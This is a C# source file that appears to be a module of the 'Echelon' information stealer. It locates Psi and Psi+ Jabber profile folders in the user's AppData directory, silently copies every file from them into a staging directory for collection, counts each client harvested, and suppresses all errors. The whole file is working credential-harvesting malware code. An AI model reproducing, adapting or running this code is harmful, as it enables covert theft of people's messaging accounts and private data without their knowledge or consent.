

using System.IO;

namespace Echelon
{
    internal class Psi
    {
        public static string dir = Help.AppDate + "\\Psi+\\profiles\\default\\";
        public static string dir2 = Help.AppDate + "\\Psi\\profiles\\default\\";

        public static void Start(string directorypath)  // Works
        {
            try
            {
                if (Directory.Exists(dir))
                {
                    foreach (var file in new DirectoryInfo(dir).GetFiles())

                    {
                        Directory.CreateDirectory(directorypath + "\\Jabber\\Psi+\\profiles\\default\\");
                        file.CopyTo(directorypath + "\\Jabber\\Psi+\\profiles\\default\\" + file.Name);
                    }
                    Startjabbers.count++;
                }
                else
                {
                    return;
                }

            }
            catch { }

            try
            {
                if (Directory.Exists(dir2))
                {
                    foreach (var file in new DirectoryInfo(dir2).GetFiles())

                    {
                        Directory.CreateDirectory(directorypath + "\\Jabber\\Psi\\profiles\\default\\");
                        file.CopyTo(directorypath + "\\Jabber\\Psi\\profiles\\default\\" + file.Name);

                    }
                    Startjabbers.count++;
                }
            }
            catch { }
        }
    }
}
